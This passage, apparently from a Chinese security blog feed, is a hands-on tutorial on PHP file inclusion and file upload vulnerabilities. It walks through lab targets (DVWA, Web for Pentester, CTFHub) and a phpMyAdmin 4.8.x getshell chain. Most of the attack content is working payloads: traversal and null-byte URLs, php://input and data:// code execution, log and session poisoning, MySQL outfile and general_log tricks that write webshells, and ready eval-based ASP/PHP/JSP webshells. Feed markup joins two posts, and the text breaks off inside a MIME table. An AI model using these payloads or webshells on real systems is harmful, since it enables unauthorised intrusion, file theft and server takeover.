当&lt;jsp:include/&gt;标签在包含一个非 JSP 文件扩展名时，即使其内容符合 JSP 语 法规范，也会读取其源代码，而不会解析其 JSP 代码： 那么此时新建一个文件： b.jsp 1234&lt;%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%&gt;&lt;% out.println("this is page b.jsp");%&gt; 那么来尝试包含 b.jsp 试试看： 这就意味着 JSP 所包含的页面即使被攻击者控制，攻击者得到的信息也是有限的。(攻击者一般都会包含一些 Web 容器的配置文件， 比如 Tomcat 的 user.xml。来获取敏感信息) 由于语言设计的差异，相对来说，JSP 比 PHP 拥有更高的安全性。PHP 从某些方面而言，它的许多优点正是它的缺点。 本地文件包含能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞(Local File Inclusion，简称 LFI)。 大多出现在模块加载、模板加载和cache调用这些地方，渗透的时候利用起来并不鸡肋，本地文件包含有多种利用方式，比如上传一个允许上传的文件格式的文件再包含来执行代码，包含 PHP 上传的临时文件，在请求 URL 或者 UA 里面加入要执行的代码，WebServer 记录到日志后再包含WebServer的日志。 123456&lt;?php error_reporting(0); $file = $_GET['file']; include($file);?&gt; 引入同目录下的一个文件时： 1index.php?file=payload.txt 当 payload.txt 的内容为： 1&lt;?php phpinfo(); ?&gt; 访问漏洞的 URL，会发现phpinfo()函数代码执行了，这个页面被当作 PHP 来解析了。 也可以传入自定义的路径信息： 123?file=../../../../../../../../windows/win.ini?file=C:\Windows\win.ini ../ 越多越好，宁缺毋滥 远程文件包含PHP 不仅可以对本地文件进行包含，还可以对远程文件进行包含(Remote File Inclusion，简称 RFI)。 如果要使用远程包含功能，首先需要确定 PHP 是否已经开启远程包含功能选项(PHP 默认关闭远程包含功能)。开启 远程包含功能需要在 php.ini 配置文件中修改，修改后需要重启 Web 容器服务使其生效，选项如下: allow_url_fopen allow_url_include (PHP 5.2 之后默认为 Off) 这样之前演示的本地问价包含，这里将路径改为 URL 的形式去包含看看： 1http://192.168.31.89/fi/index.php?file=http://192.168.31.89/fi/payload.txt 远程包含与本地包含没有区别，无论是哪种扩展名，只要遵循 PHP 语法规范，PHP 解析器，就会对其解析。 尝试包含 其他远程文件测试看看： 1http://192.168.31.89/fi/index.php?file=http://www.baidu.com/robots.txt 一句话工作原理GET 型123456&lt;?php @eval($_GET['pass']);?&gt;shell.php?pass=phpinfo();shell.php?pass=system('dir');shell.php?pass=system('ipconfig'); POST 型123&lt;?php @eval($_POST['pass']);?&gt; 和 GET 型类似，只是传参的方式变了： REQUEST 型123&lt;?php @eval($_REQUEST['pass']);?&gt; 可以接受URL和表单传参 客户端中国蚁剑项目地址：https://github.com/AntSwordProject/antSword 文档详情：https://doc.u0u.us/zh-hans/ 中国蚁剑可以设置 Burpsuite 的代理，这样可以很方便地查看中国蚁剑的实际的流量情况，可以加深对一句话木马的理解以及后面进阶的 Bypass 操作： 冰蝎项目地址：https://github.com/rebeyond/Behinder 中国菜刀经典的管理工具，但是由于可能存在后门的可能，不建议大家使用中国菜刀。 网友项目地址：https://github.com/raddyfiy/caidao-official-version 文件包含之截断防护措施大多数程序猿认为 PHP 中的包含漏洞比较好修复，固定扩展名即可，代码如下: 123456&lt;?php error_reporting(0); if(isset($_GET['file']))&#123; include $_GET['file'] .".php"; &#125;?&gt; 当进行包含时，不需要传输文件扩展名，例如，想要包含 News.php 页面，只需要传入 ?file=News 即可。这样可以变相地修复包含漏洞。 复现漏洞尝试之前的 Payload 进行测试 1?file=../../../../../../../../windows/win.ini 并没成功读取到问价内容，这个时候关掉 PHP的 忽略BUG的代码，尝试看下到底发生了什么： 这个导致我们无法随心所欲地去读取系统文件信息了，因为这个文件显然是不存在的，这个时候程序猿就会想到使用字符串截断的方法来进行绕过。 %00截断截断的原理：PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节(\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串 1?file=payload.txt\0 因为浏览器 URL 并不支持 \，因此通过浏览访问的时候需要通过 urlencode 进行编码，变成： 1?file=payload.txt%00 这种方法只适用于 magic_quotes_gpc = Off PHP 版本小于 5.3.4 如果为 On %00(NULL)将会被转义，从而无法正常截断。 magic_quotes_gpc 为 On 的情况会为以下预定义字符转义: 单引号(‘) 双引号(“) 反斜杠() NULL 路径长度截断条件：PHP 的老版本（PHP &lt;=5.3.4）、Windows 或 Linux Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。./表示当前路径。 1?file=payload.txt././././././././超过一定数量的./././././ 点号截断条件：PHP 的老版本（PHP &lt;=5.3.4），Windows Winodws 下目录最大长度为 256 字节，Windows 下cd ...显示的还是当前目录（点的数量不等于2时） 1?file=payload.txt........超过一定数量的........ 远程文件截断 robot.txt 禁止爬虫日志:可以看到网站隐藏的一些目录 可以通过空格、井号、问号截断绕过，不受GPC和PHP版本限制，只要能返回代码给包含函数，它就能执行： 12345678# 空格截断?file=http://192.168.31.89/fi/payload.txt%20# 问号截断?file=http://192.168.31.89/fi/payload.txt?# 井号截断?file=http://192.168.31.89/fi/payload.txt%23 PHP 伪协议PHP 带有很多内置 URL 风格的封装协议，这类协议与 fopen()、copy()、file_exists()、filesize() 等文件系统函数所提供的功能类似。 名称 含义 file:// 访问本地文件系统 http:// 访问 HTTP(s)网址 ftp:// 访问 FTP(s) URLs php:// 访问输入/输出流(I/O streams) zlib:// 压缩流 data:// 数据(RFC 2397) ssh2:// Secure Shell 2 expect:// 处理交互式的流 glob:// 查找匹配的文件路径 利用php伪协议进行远程文件包含： 访问URL：http://10.11.29.138/fi/php.php?file=php://filter/convert.base64-encode/resource=flag.php php.php : 1234&lt;?php $file = $_GET['file']; include($file);?&gt; php://filter（文件读取）获取指定文件源码，我们一般对其进行编码来读取一些 PHP 源码信息。 123?file=php://filter/read=convert.base64-encode/resource=index.php?file=php://filter/convert.base64-encode/resource=index.php?filename=php://filter/convert.iconv.utf-16le.utf-8/resource=flag.php 这里要访问php.php，所以最后改成php.php 访问 URL，得到经过 Base64 加密后的字符串: 1PD9waHANCiAgICAkZmlsZSA9ICRfR0VUWydmaWxlJ107DQogICAgaW5jbHVkZSgkZmlsZSk7DQo/Pg== php://input（写入木马）使用 php://input 可以获取POST的数据流，如果满足条件也可以直接执行 PHP 语句。 条件： allow_url_include 这可以理解成远程文件包含漏洞（RFI），即 POST 过去PHP代码，即可执行。 如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。 1&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST["pass"])?&gt;');?&gt; 此时木马就已经写入到了 index.php 的同级目录下了： 同理还可以直接命令执行： 1?file=php://input POST 数据内容如下，来执行命令： 1&lt;?php system('ipconfig');?&gt; data://伪协议类似于php://input，可以让用户来控制输入流，如果和文件包含结合的话，可以将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，导致可以执行任意 payload 条件： allow_url_fopen=On allow_url_include=On PHP &gt; 5.2 12?file=data:text/plain,&lt;?php phpinfo();?&gt;?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 12345678# 明文&lt;?php phpinfo();?&gt;# base64 编码PD9waHAgcGhwaW5mbygpOz8+# + URL 转码PD9waHAgcGhwaW5mbygpOz8%2b 蓝帽杯文件包含思路https://yanmymickey.github.io/2020/04/17/CTFwp/Phuck2/ ?page=data:123/res 当allow_url_include=Off时 创建的是data:123文件夹下的res文件 file_get_contents在处理data:123/res时会直接处理data:去掉伪协议后再读取123文件夹下的res,而此文件夹不存在 include() 函数不认识伪协议,所以会直接包含data:123文件夹下的res phar://伪协议这个参数是就是 PHP 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。并且相对路径和绝对路径都可以使用。 条件：PHP &gt;= 5.3 文件 payload.txt，其内容为&lt;?php phpinfo();?&gt;，打包成 zip 压缩包，如下： 12?file=phar://payload.zip/payload.txt?file=phar://C:/PhpStudy/PHPTutorial/WWW/fi/payload.zip/payload.txt zip://伪协议zip 伪协议和phar协议类似，可以访问压缩包里面的文件。但是用法不一样。 条件：PHP &gt;= 5.2 12# 用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。 需要指定绝对路径 # 要注意 URL 编码 1?file=zip://C:/PhpStudy/PHPTutorial/WWW/fi/payload.zip%23payload.txt 若是使用相对路径，则会包含失败。 实战中包含技巧包含 HTTP 日志条件：知道服务器日志的存储路径，且日志文件可读。 怎么合法的往服务器写马：利用头像、SSH日志、Web日志、Sessions 常见日志位置： 1234567891011121314151617181920212223242526272829/var/log/nginx/access_log/var/log/nginx/errors_log/var/log/apache/access_log/var/log/apache/error_log/var/log/apache2/access.log/var/log/apache2/error.log/var/log/httpd/access.log/var/log/httpd/error.log/var/www/logs/error.log/var/www/logs/access.log/apache/logs/error.log/apache/logs/access.log/usr/local/apache/logs/access.log/usr/local/apache/logs/error.log/usr/local/apache2/logs/access.log/usr/local/apache2/logs/error.log/etc/httpd/logs/access_log/etc/httpd/logs/error_logC:\PhpStudy\PHPTutorial\Apache\logs\access.logC:\PhpStudy\PHPTutorial\Apache\logs\error.log 也可以读取配置文件来查找对应的日志： 123456789/etc/httpd/conf/httpd.conf/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/etc/apache2/apache2.conf# nginx -t 测试配置文件是否正确，同时也告诉了配置文件的路径/usr/local/etc/nginx/nginx.conf/etc/nginx/nginx.conf 如果可以执行命令的话，也可以手动 find 来查找配置文件信息： 12find / -name nginx.conffind / -name httpd.conf Window 2003 + IIS6.0 日志文件默认放在 123C:\WINDOWS\system32\Logfiles配置文件默认在C:\Windows\system32\inetsrv\metabase.xml IIS 7 日志文件默认在 1C:\inetpub\logs\LogFiles 配置文件默认目录 12345678910C:\Windows\System32\inetsrv\config\applicationHost.configC:\apache\logs\access.logC:\Program Files\Apache Group\Apache\logs\access.logC:\program files\wamp\apache2\logsC:\wamp\logsC:\xampp\apache\logs\error.logC:\apache\logs\error.logC:\Program Files\Apache Group\Apache\logs\error.logC:\wamp\apache2\logsC:\xampp\apache\logs\access.log 尝试将敏感信息写入到日志中： 1http://192.168.31.89/&lt;?php phpinfo();?&gt; 但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用 burp 截包后修改。 然后尝试直接包含日志文件： 1http://192.168.31.89/fi/?file=C:\PhpStudy\PHPTutorial\Apache\logs\access.log 包含SSH日志SSH日志也可以用来进行包含，以为大多数情况下这个日志文件上是可读的。 默认情况下为 /var/log/auth.log 1ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@10.211.55.5 包含用户上传的文件 用户上传的文件 常用于图马，图马制作: 1copy xx.jpg/b+xxx.php/a shell.jpg b 表示二进制文件 a表示asscii码文件 临时文件、其他服务的文件 包含 session条件：session 文件路径已知，且其中内容可控。 linux 常见/etc/passwd windows常见 windows/win.ini PHP 的 session 文件的保存路径可以在 phpinfo 的 session.save_path 看到： 常见的 php-session 存放位置： 12345678C:\PhpStudy\PHPTutorial\tmp\tmp\sess_PHPSESSID/var/lib/php/sessions/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/var/lib/php5/sessions/sess_PHPSESSID/var/lib/php5/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSIDsession` 的文件名格式为 `sess_[phpsessid] 有些情况下 phpsessid 在发送的请求的 cookie 字段中也可以看到: 要包含并利用的话，需要能控制部分 sesssion 文件的内容。暂时没有通用的办法，下方是故意写一个可以控制 Session 内容的 PHP 代码： 12345678&lt;?php error_reporting(0); session_start(); $username = $_GET['username']; $_SESSION['username'] = $username; highlight_file(__FILE__);?&gt; 然后浏览器访问： 1http://x.x.x.x/FI/?username=2333 找到这个 session 文件来看看我们是否成功控制了 session 文件的内容了： 那么可以直接往 session 文件里面写 payload 然后配合文件包含： 1http://x.x.x.x/FI/?username=&lt;?php phpinfo();?&gt; DVWA 实战LOW123456&lt;?php// The page we wish to display$file = $_GET[ 'page' ];?&gt; 可以看到，服务器端对page参数没有做任何的过滤跟检查。 服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 1234..\..\..\..\..\..\..\windows/win.ini访问 C:/windows/win.ini..\../..\../..\../..\../..\../..\../windows/win.ini?page=http://127.0.0.1/FI/1/payload.txt 如果服务器对../等做一些过滤的话，可以用一些编码来进行绕过: 12345678910../%2e%2e%2f..%2f%2e%2e/%252e%252e%252f..\%2e%2e%5c..%5c%2e%2e\%252e%252e%255c medium12345678910&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// Input validation$file = str_replace( array( "http://", "https://" ), "", $file );$file = str_replace( array( "../", "..\"" ), "", $file );?&gt; 可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理 使用 str_replace 函数替换为空的话，是极其不安全的，因为可以使用双写绕过替换规则： 1...\.\...\.\...\.\...\.\...\.\...\.\...\.\windows\win.ini High12345678910111213&lt;php//Thepagewewishtodisplay$file=$_GET['page'];//Inputvalidationif(!fnmatch("file*",$file)&amp;&amp;$file!="include.php")&#123; //Thisisn'tthepagewewant!echo"ERROR:Filenotfound!";exit;&#125;&gt; 可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。 1file:///C:/Windows/win.ini file:///c:/windows/system32/cmd.exe 可以沙盒溢出弹出取￥机cmd Web for Pentester 靶场Example 1 常规关键代码： 123456&lt;?php require_once '../header.php'; ?&gt;&lt;?php if ($_GET["page"]) &#123; include($_GET["page"]); &#125;?&gt; 最基础的文件包含，page 变量通过 GET 方式传递值，然后直接被 include 函数包含，下面直接丢 payload: 1/fileincl/example1.php?page=/etc/passwd 尝试了一下，发现还可以进行远程文件包含： 1/fileincl/example1.php?page=http://www.baidu.com/robots.txt Example 2 截断关键代码： 12345678&lt;?php if ($_GET["page"]) &#123; $file = $_GET["page"].".php"; // simulate null byte issue $file = preg_replace('/\x00.*/',"",$file); include($file); &#125;?&gt; 虽然在 page 后面手动添加了 .php 后缀了，但是下面在正则依然是\x00.*谜一样的操作，依然是吧 00 截断以及后面的内容都替换为空，这样间接地帮助我们把 .php 给干掉了，那么就直接丢 payload 吧: 1/fileincl/example2.php?page=/etc/passwd%00 实际上如果进行远程文件包含的话，还可以使用?和#截断，#的 URL 编码就是 %23: 12/fileincl/example2.php?page=https://www.baidu.com/robots.txt?/fileincl/example2.php?page=https://www.baidu.com/robots.txt%23 phpMyAdmin 综合利用案例常用方法 直接写shell条件：MySQL的load_file()开启，知道网站的物理路径 load_file() 1234567mysql&gt; show global variables like '%secure%';+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_auth | OFF || secure_file_priv | |+------------------+-------+ 物理路径 执行如下语句来写入 shell 文件： 123select '&lt;?php phpinfo(); ?&gt;' into outfile 'C:\\PhpStudy\\PHPTutorial\\WWW\\fi\\info.php';select '&lt;?php phpinfo(); ?&gt;' into outfile 'C:/PhpStudy/PHPTutorial/WWW/fi/info.php'; 开启日志写 shellMySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell 1234567mysql&gt; SHOW VARIABLES LIKE 'general%';+------------------+-----------------------------------------------+| Variable_name | Value |+------------------+-----------------------------------------------+| general_log | OFF || general_log_file | C:\PhpStudy\PHPTutorial\MySQL\data\GGD2F3.log |+------------------+-----------------------------------------------+ general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。 如果可以自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell 12set global general_log = "ON";set global general_log_file='C:/PhpStudy/PHPTutorial/WWW/shell.php'; 检测是否开启了日志功能： 1234567mysql&gt; SHOW VARIABLES LIKE 'general%';+------------------+---------------------------------------+| Variable_name | Value |+------------------+---------------------------------------+| general_log | ON || general_log_file | C:/PhpStudy/PHPTutorial/WWW/shell.php |+------------------+---------------------------------------+ 因为日志会记录任何数据，这个时候直接输入：&#39;&lt;?php phpinfo();?&gt;&#39; 尽管已经报错了： 但是数据库日志文件里面已经记录对应的语句文件： 浏览器访问验证效果： 文件包含 session 利用phpMyAdmin4.8.X 版本中的本地文件包含漏洞：phpmyadmin4.8.1后台getshell。该漏洞利用不要求root帐号，只需能够登录 phpMyAdmin 便能够利用。 123456# Windows文件包含/index.php?target=db_sql.php%253f/../../../../../../../../../../windows/win.ini# Linux文件包含/index.php?target=db_sql.php%253f/../../../../../../../../../../etc/passwd/index.php?target=db_sql.php%253f/../../../../../../../../../../etc/hosts 执行一个敏感的语句： 本次测试环境的 session 的位置是： 1C:\PhpStudy\PHPTutorial\tmp\tmp\sess_PHPSESSID 可以通过审查元素或者抓包来查看当前的 session： 查找对应的文件来看看： 然后尝试去包含这个 session 文件 1/index.php?target=db_sql.php%253f/../../../../../../../../../../PhpStudy/PHPTutorial/tmp/tmp/sess_282p45oo4a4bjb4i7d1h2hdr58coi87i 尝试更复杂的语句： 123&lt;?php system('echo ^&lt;?php eval($_POST[gg])?^&gt; &gt; gg.php')?&gt;# 手动生成木马再连&lt;?php fputs(fopen('gg.php','w'),'&lt;?php eval($_POST[gg])?&gt;');?&gt;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F%2F2020%2F08%2F931c692.html</url>
    <content type="text"><![CDATA[文件上传漏洞文件上传漏洞简介现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，比如企业的 OA 系统，允许用户上传图片、视频、头像和许多其他类型的文件。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应 用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。 漏洞产生原因上传文件时，如果服务端代码没有对客户端上传的文件进行严格的验证和过滤， 就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式的文件)。 漏洞的危害非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门， WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。 WebShell 就是以 ASP、PHP、JSP 等网页脚本存在的一种命令执行环节，通常也叫做网页后门。攻击者在入侵了一个网站后，通常会将 WebShell 上传到网站的根目录下或者插入到正常的网页中，然后使用浏览器或者对应的 WebShell 客户端来访问这些后门，将会得到一个命令执行的环境，以达到控制网站服务器的目的。 ASP 123&lt;%eval request(&quot;x&quot;)%&gt;&lt;%execute request(&quot;x&quot;)%&gt; ASPX 1&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;x&quot;],”unsafe”);%&gt; PHP 123&lt;?php eval($_POST['x'])?&gt;&lt;?php assert($_POST['x']); ?&gt; JSP CMD WebShell 1234567891011121314&lt;% if("x".equals(request.getParameter("pwd"))) &#123; java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("&lt;pre&gt;"); while((a=in.read(b))!=-1) &#123; out.println(new String(b)); &#125; out.print("&lt;/pre&gt;"); &#125;%&gt; 在大多数情况下，要完成文件上传漏洞这个攻击，要满足如下几个条件： 首先，上传的文件能够被 Web 容器解释执行。所以文件上传后所在的目录要是 Web 容器所覆盖到的路径。 其次，用户能够从 Web 上访问这个文件。如果文件上传了，但用户无法通过 Web 访问，或者无法使得 Web容器解释这个脚本，那么也不能称之为漏洞。 最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。 CTF Hub 文件上传无验证因为没有验证，所以可以直接上传一个一句话木马： 通过提示得知一句话木马的路径为： 1http://x.x.x.x:10080/upload/shell.php 蚁剑连接在网站根目录下可以找到 flag 的 PHP 文件，打开即可获得 Flag 前端验证一般弹窗都是前端验证 JS 前端验证，上传一个 shell.php 发现提示不允许上传： 审查元素发现 JS 代码中出现了文件后缀判断的代码： 123456789101112131415161718192021&lt;script&gt;function checkfilesuffix()&#123; var file=document.getElementsByName('file')[0]['value']; if(file==""||file==null) &#123; alert("请添加上传文件"); return false; &#125; else &#123; var whitelist=new Array(".jpg",".png",".gif"); var file_suffix=file.substring(file.lastIndexOf(".")); if(whitelist.indexOf(file_suffix) == -1) &#123; alert("该文件不允许上传"); return false; &#125; &#125;&#125;&lt;/script&gt; 可以直接通过 Chrome 来调试这窜 JS 进行绕过，下断点直接修改值： 断点要从26行下移到27行然后放包 本题通过 BP 抓包也是可以直接绕过的，正常的思路一般就是直接通过 BP 抓包，这里的 JS 调试只当做是一个小技巧来学习，并不是主流的上传绕过方式。 .htaccesshtaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能 先上传一个名为.htaccess的文件，内容为： 1AddType application/x-httpd-php .png 这表示让 png 后缀的文件当做 PHP 来解析： 此时上传一个 png 图片，但是图片内容是 PHP： 此时使用中国蚁剑可以直接连接成功 MIME 绕过媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。 本关直接修改 Content-Type 即可实现上传绕过： MimeTypes表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280mimes = [(&quot;ez&quot;, &quot;application/andrew-inset&quot;), (&quot;anx&quot;, &quot;application/annodex&quot;), (&quot;atom&quot;, &quot;application/atom+xml&quot;), (&quot;atomcat&quot;, &quot;application/atomcat+xml&quot;), (&quot;atomsrv&quot;, &quot;application/atomserv+xml&quot;), (&quot;lin&quot;, &quot;application/bbolin&quot;), (&quot;cap&quot;, &quot;application/cap&quot;), (&quot;pcap&quot;, &quot;application/cap&quot;), (&quot;cu&quot;, &quot;application/cu-seeme&quot;), (&quot;davmount&quot;, &quot;application/davmount+xml&quot;), (&quot;tsp&quot;, &quot;application/dsptype&quot;), (&quot;es&quot;, &quot;application/ecmascript&quot;), (&quot;spl&quot;, &quot;application/futuresplash&quot;), (&quot;hta&quot;, &quot;application/hta&quot;), (&quot;jar&quot;, &quot;application/java-archive&quot;), (&quot;ser&quot;, &quot;application/java-serialized-object&quot;), (&quot;class&quot;, &quot;application/java-vm&quot;), (&quot;js&quot;, &quot;application/javascript&quot;), (&quot;m3g&quot;, &quot;application/m3g&quot;), (&quot;hqx&quot;, &quot;application/mac-binhex40&quot;), (&quot;cpt&quot;, &quot;application/mac-compactpro&quot;), (&quot;nb&quot;, &quot;application/mathematica&quot;), (&quot;nbp&quot;, &quot;application/mathematica&quot;), (&quot;mdb&quot;, &quot;application/msaccess&quot;), (&quot;doc&quot;, &quot;application/msword&quot;), (&quot;dot&quot;, &quot;application/msword&quot;), (&quot;mxf&quot;, &quot;application/mxf&quot;), (&quot;bin&quot;, &quot;application/octet-stream&quot;), (&quot;oda&quot;, &quot;application/oda&quot;), (&quot;ogx&quot;, &quot;application/ogg&quot;), (&quot;pdf&quot;, &quot;application/pdf&quot;), (&quot;key&quot;, &quot;application/pgp-keys&quot;), (&quot;pgp&quot;, &quot;application/pgp-signature&quot;), (&quot;prf&quot;, &quot;application/pics-rules&quot;), (&quot;ps&quot;, &quot;application/postscript&quot;), (&quot;ai&quot;, &quot;application/postscript&quot;), (&quot;eps&quot;, &quot;application/postscript&quot;), (&quot;epsi&quot;, &quot;application/postscript&quot;), (&quot;epsf&quot;, &quot;application/postscript&quot;), (&quot;eps2&quot;, &quot;application/postscript&quot;), (&quot;eps3&quot;, &quot;application/postscript&quot;), (&quot;rar&quot;, &quot;application/rar&quot;), (&quot;rdf&quot;, &quot;application/rdf+xml&quot;), (&quot;rss&quot;, &quot;application/rss+xml&quot;), (&quot;rtf&quot;, &quot;application/rtf&quot;), (&quot;smi&quot;, &quot;application/smil&quot;), (&quot;smil&quot;, &quot;application/smil&quot;), (&quot;xhtml&quot;, &quot;application/xhtml+xml&quot;), (&quot;xht&quot;, &quot;application/xhtml+xml&quot;), (&quot;xml&quot;, &quot;application/xml&quot;), (&quot;xsl&quot;, &quot;application/xml&quot;), (&quot;xsd&quot;, &quot;application/xml&quot;), (&quot;xspf&quot;, &quot;application/xspf+xml&quot;), (&quot;zip&quot;, &quot;application/zip&quot;), (&quot;apk&quot;, &quot;application/vnd.android.package-archive&quot;), (&quot;cdy&quot;, &quot;application/vnd.cinderella&quot;), (&quot;kml&quot;, &quot;application/vnd.google-earth.kml+xml&quot;), (&quot;kmz&quot;, &quot;application/vnd.google-earth.kmz&quot;), (&quot;xul&quot;, &quot;application/vnd.mozilla.xul+xml&quot;), (&quot;xls&quot;, &quot;application/vnd.ms-excel&quot;), (&quot;xlb&quot;, &quot;application/vnd.ms-excel&quot;), (&quot;xlt&quot;, &quot;application/vnd.ms-excel&quot;), (&quot;cat&quot;, &quot;application/vnd.ms-pki.seccat&quot;), (&quot;stl&quot;, &quot;application/vnd.ms-pki.stl&quot;), (&quot;ppt&quot;, &quot;application/vnd.ms-powerpoint&quot;), (&quot;pps&quot;, &quot;application/vnd.ms-powerpoint&quot;), (&quot;xlsx&quot;, &quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;), ( &quot;xltx&quot;, &quot;application/vnd.openxmlformats-officedocument.spreadsheetml.template&quot;), ( &quot;pptx&quot;, &quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;), ( &quot;ppsx&quot;, &quot;application/vnd.openxmlformats-officedocument.presentationml.slideshow&quot;), ( &quot;potx&quot;, &quot;application/vnd.openxmlformats-officedocument.presentationml.template&quot;), ( &quot;docx&quot;, &quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;), ( &quot;dotx&quot;, &quot;application/vnd.openxmlformats-officedocument.wordprocessingml.template&quot;), (&quot;cod&quot;, &quot;application/vnd.rim.cod&quot;), (&quot;mmf&quot;, &quot;application/vnd.smaf&quot;), (&quot;sis&quot;, &quot;application/vnd.symbian.install&quot;), (&quot;vsd&quot;, &quot;application/vnd.visio&quot;), (&quot;wbxml&quot;, &quot;application/vnd.wap.wbxml&quot;), (&quot;wmlc&quot;, &quot;application/vnd.wap.wmlc&quot;), (&quot;wmlsc&quot;, &quot;application/vnd.wap.wmlscriptc&quot;), (&quot;wpd&quot;, &quot;application/vnd.wordperfect&quot;), (&quot;wp5&quot;, &quot;application/vnd.wordperfect5.1&quot;), (&quot;wk&quot;, &quot;application/x-123&quot;), (&quot;7z&quot;, &quot;application/x-7z-compressed&quot;), (&quot;abw&quot;, &quot;application/x-abiword&quot;), (&quot;dmg&quot;, &quot;application/x-apple-diskimage&quot;), (&quot;bcpio&quot;, &quot;application/x-bcpio&quot;), (&quot;torrent&quot;, &quot;application/x-bittorrent&quot;), (&quot;cab&quot;, &quot;application/x-cab&quot;), (&quot;cbr&quot;, &quot;application/x-cbr&quot;), (&quot;cbz&quot;, &quot;application/x-cbz&quot;), (&quot;cdf&quot;, &quot;application/x-cdf&quot;), (&quot;cda&quot;, &quot;application/x-cdf&quot;), (&quot;vcd&quot;, &quot;application/x-cdlink&quot;), (&quot;pgn&quot;, &quot;application/x-chess-pgn&quot;), (&quot;cpio&quot;, &quot;application/x-cpio&quot;), (&quot;csh&quot;, &quot;application/x-csh&quot;), (&quot;deb&quot;, &quot;application/x-debian-package&quot;), (&quot;udeb&quot;, &quot;application/x-debian-package&quot;), (&quot;dcr&quot;, &quot;application/x-director&quot;), (&quot;dir&quot;, &quot;application/x-director&quot;), (&quot;dxr&quot;, &quot;application/x-director&quot;), (&quot;dms&quot;, &quot;application/x-dms&quot;), (&quot;wad&quot;, &quot;application/x-doom&quot;), (&quot;dvi&quot;, &quot;application/x-dvi&quot;), (&quot;rhtml&quot;, &quot;application/x-httpd-eruby&quot;), (&quot;pfa&quot;, &quot;application/x-font&quot;), (&quot;pfb&quot;, &quot;application/x-font&quot;), (&quot;gsf&quot;, &quot;application/x-font&quot;), (&quot;pcf&quot;, &quot;application/x-font&quot;), (&quot;pcf.Z&quot;, &quot;application/x-font&quot;), (&quot;mm&quot;, &quot;application/x-freemind&quot;), (&quot;spl&quot;, &quot;application/x-futuresplash&quot;), (&quot;gnumeric&quot;, &quot;application/x-gnumeric&quot;), (&quot;sgf&quot;, &quot;application/x-go-sgf&quot;), (&quot;gcf&quot;, &quot;application/x-graphing-calculator&quot;), (&quot;gtar&quot;, &quot;application/x-gtar&quot;), (&quot;tgz&quot;, &quot;application/x-gtar&quot;), (&quot;taz&quot;, &quot;application/x-gtar&quot;), (&quot;hdf&quot;, &quot;application/x-hdf&quot;), (&quot;phtml&quot;, &quot;application/x-httpd-php&quot;), (&quot;pht&quot;, &quot;application/x-httpd-php&quot;), (&quot;php&quot;, &quot;application/x-httpd-php&quot;), (&quot;phps&quot;, 